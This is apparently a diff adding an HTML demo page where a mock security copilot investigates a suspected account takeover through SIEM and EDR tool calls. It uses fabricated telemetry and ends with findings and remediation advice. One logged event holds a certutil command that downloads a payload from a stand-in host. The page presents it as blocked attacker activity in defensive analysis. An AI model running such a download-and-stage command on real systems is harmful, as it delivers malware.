+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>Now I’m looking at identity behaviour and related alerts for <code>USER-Z</code>.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_user_analysis_data</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "user": "USER-Z"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "user": "USER-Z",
+  "normal_profile": {
+    "countries": ["India"],
+    "devices": ["LAPTOP-USERZ"],
+    "typical_hours": "09:00-18:00 IST"
+  },
+  "recent_logins": [
+    {
+      "country": "Germany",
+      "device": "vpn-gateway-01",
+      "timestamp_utc": "2025-12-03T06:22:14Z",
+      "source_ip": "203.0.113.10"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_ip_analysis_data</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "ip": "203.0.113.10"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "ip": "203.0.113.10",
+  "risk_level": "high",
+  "categories": [
+    "credential-stuffing",
+    "proxy-infrastructure"
+  ],
+  "seen_in_other_tenants": true
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_alerts</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "user:'USER-Z' AND severity:&gt;='medium'",
+  "window": "last 24 hours"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "alerts": [
+    {
+      "id": "ALERT-GEO-USERZ-01",
+      "title": "Unusual geolocation login for USER-Z (India → Germany in 20 minutes)",
+      "severity": "high"
+    },
+    {
+      "id": "ALERT-NEW-VPN-USERZ-01",
+      "title": "New VPN device/profile used by USER-Z",
+      "severity": "medium"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_user_risk_score</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "user": "USER-Z"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "user": "USER-Z",
+  "score": 79,
+  "risk_level": "high",
+  "drivers": [
+    "new country",
+    "new device",
+    "multiple failed logins followed by success from high-risk IP"
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">generate_query</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "query": "Show all login attempts by USER-Z in last 24 hours",
+  "window": "last 24 hours"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "query": "SELECT * FROM auth_logs WHERE user = 'USER-Z' AND timestamp &gt;= now()-24h ORDER BY timestamp ASC"
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">execute_query</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "query": "SELECT * FROM auth_logs WHERE user = 'USER-Z' AND timestamp &gt;= now()-24h ORDER BY timestamp ASC"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "clusters": [
+    {
+      "label": "office-logins",
+      "country": "India",
+      "device": "LAPTOP-USERZ",
+      "time_window": "business_hours"
+    },
+    {
+      "label": "vpn-logins",
+      "country": "Germany",
+      "device": "vpn-gateway-01",
+      "time_window": "outside_hours",
+      "includes_ip": "203.0.113.10"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>These signals together are very consistent with compromised credentials. Next I’ll check the endpoint assigned to USER-Z for earlier hints of compromise.</p>
+            </div>
+          </div>
+
+          <!-- Falcon: host compromise -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>Now I’m looking in CrowdStrike for USER-Z’s primary device and any relevant detections.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">discover.hosts</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">falcon-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "assigned_user:'USER-Z'"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "hosts": [
+    {
+      "hostname": "LAPTOP-USERZ",
+      "os": "Windows 11",
+      "sensor_status": "online",
+      "policy": "workstation_standard"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">incidents.read</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">falcon-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "device_id:'LAPTOP-USERZ' AND start_time:[now-24h TO now]"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "incidents": [
+    {
+      "id": "INC-BROWSER-CRED-HARVEST-USERZ-01",
+      "title": "Browser credential harvesting script blocked",
+      "severity": "medium",
+      "timestamp_utc": "2025-12-03T05:40:00Z"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>This timing lines up very well with a credential-theft scenario feeding into the external login attempts.</p>
+            </div>
+          </div>
+
+          <!-- SentinelOne: post-login activity -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>Finally, I’ll check SentinelOne to see what was done after the suspicious VPN success, especially on shared servers.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">telemetry.events</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">sentinelone-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "user:USER-Z AND event_type:process_start",
+  "window": "2h_after_successful_login"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "events": [
+    {
+      "host": "APP-SRV-02",
+      "user": "USER-Z",
+      "process_name": "powershell.exe",
+      "source": "remote_session"
+    },
+    {
+      "host": "APP-SRV-02",
+      "user": "USER-Z",
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -split -f https://example.com/payload.exe C:\\\\ProgramData\\\\payload.exe"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">alerts.get</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">sentinelone-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "user:USER-Z AND host:APP-SRV-02"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "alerts": [
+    {
+      "id": "S1-ALERT-CERTUTIL-USERZ-01",
+      "title": "Suspicious certutil script fetching remote payload",
+      "severity": "high",
+      "action": "blocked_and_quarantined"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">process.graph</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">sentinelone-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "session_id": "USER-Z-vpn-session-2025-12-03-06-22"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "graph": {
+    "session_id": "USER-Z-vpn-session-2025-12-03-06-22",
+    "chain": [
+      "vpn-login",
+      "remote-session(APP-SRV-02)",
+      "explorer.exe",
+      "powershell.exe",
+      "certutil.exe"
+    ]
+  }
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SHORTENED FINDINGS FOR USE CASE 2 -->
+              <h3>Findings 🔐</h3>
+              <p>
+                This pattern is **strongly consistent with credential compromise**, not a normal remote
+                login. We see many failed attempts from a risky external IP, followed by one successful VPN
+                login from a new country and device, and then suspicious post-login activity.
+              </p>
+
+              <h4>What each tool shows 🔍</h4>
+              <ul>
+                <li>
+                  <strong>Elastic</strong> – Shows a burst of **35 failed logins** followed by a single
+                  success from <code>203.0.113.10</code>. The login originates from a region that
+                  <code>USER-Z</code> has never used before.
+                </li>
+                <li>
+                  <strong>Log360Cloud (Identity + UEBA)</strong> – Confirms the user normally logs in only
+                  from India and a known laptop. The new **country (Germany)** + new VPN device +
+                  high-risk IP pushes the user’s risk score to **high**, and we see access to unusual
+                  systems right after the login – classic recon behaviour.
+                </li>
+                <li>
+                  <strong>CrowdStrike Falcon</strong> – On <code>LAPTOP-USERZ</code>, recently blocked a
+                  **browser credential harvesting script** just before the suspicious external login,
+                  neatly linking local compromise to remote account abuse.
+                </li>
+                <li>
+                  <strong>SentinelOne</strong> – After the VPN success, the account is used on
+                  <code>APP-SRV-02</code> to run remote PowerShell and <code>certutil.exe</code> to fetch a
+                  payload. SentinelOne blocks/quarantines it, but the intent is clearly **malicious
+                  post-login activity**.
+                </li>
+              </ul>
+
+              <h4>Verdict ✅</h4>
+              <p>
+                The combined evidence shows an **early-stage account takeover**: credentials stolen on the
+                user’s laptop, abused from a hostile IP, and then used to probe internal servers. You should
+                immediately reset the user’s credentials, revoke active sessions, review impacted servers
+                (especially <code>APP-SRV-02</code>), and tighten controls (MFA, geo/IP restrictions, device
+                posture checks) for future remote logins.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Shared input bar -->
+        <div class="input-bar">
+          <div class="input-wrapper">
+            <span>U</span>
+            <input type="text" disabled value="MCP Copilot demo – tabs switch between Use Case 1 and Use Case 2." />
+            <span>⏎</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Toggle tool blocks
+    document.querySelectorAll('[data-toggle]').forEach(function (header) {
+      header.addEventListener('click', function () {
+        var block = header.closest('.tool-block');
+        block.classList.toggle('open');
+      });
+    });
+
+    // Tab switching between use cases
+    const tabs = document.querySelectorAll('.tab');
+    const screens = document.querySelectorAll('.chat-screen');
+
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        const target = tab.getAttribute('data-target');
+
+        tabs.forEach(t => t.classList.remove('active'));
+        screens.forEach(s => s.classList.remove('active'));
+
+        tab.classList.add('active');
+        const screen = document.querySelector(target);
+        if (screen) screen.classList.add('active');
+      });
+    });
+  </script>
+</body>
+</html>
